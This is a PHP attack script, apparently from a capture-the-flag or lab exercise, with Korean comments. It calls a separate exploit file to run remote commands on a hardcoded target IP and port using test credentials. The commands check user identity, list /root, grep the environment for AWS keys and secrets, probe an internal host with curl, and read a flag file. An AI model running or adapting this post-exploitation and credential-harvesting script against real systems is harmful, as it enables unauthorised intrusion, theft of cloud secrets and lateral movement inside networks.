<?php
/**
 * 원격 명령 실행 및 결과 수집
 */

$target = "http://13.125.104.131:30083";
$user = "testuser";
$pass = "testpass";
$exploit = __DIR__ . "/../loot/fearsoff_exploit.php";

// fearsoff_exploit.php 로드
require_once $exploit;

function run_commands() {
    global $target, $user, $pass;

    $commands = array(
        "whoami",
        "id",
        "ls -la /root/ | head -20",
        "env | grep -iE 'AWS|SECRET|KEY|FLAG'",
        "curl -s -m 3 http://10.0.1.10:8080/ | head -50",
        "cat /var/www/FLAG.txt 2>&1",
    );

    $results = array();

    foreach ($commands as $cmd) {
        echo "[*] Running: $cmd\n";

        // 결과를 파일에 저장하는 명령으로 변경
        $output_file = "/tmp/recon_" . bin2hex(random_bytes(4)) . ".txt";
        $cmd_with_output = "$cmd > $output_file 2>&1";

        // fearsoff_exploit.php 호출 (함수를 직접 사용하려고 했지만, 복잡함)
        // 대신 PHP의 exec() 사용

        $result = shell_exec("php " . escapeshellarg(__DIR__ . "/../loot/fearsoff_exploit.php") . " " .
                            escapeshellarg($target) . " " .
                            escapeshellarg($user) . " " .
                            escapeshellarg($pass) . " " .
                            escapeshellarg($cmd_with_output));

        echo $result . "\n";

        $results[$cmd] = $result;
    }

    return $results;
}

echo "=== Remote Reconnaissance ===\n\n";
run_commands();
echo "\n=== Complete ===\n";
?>
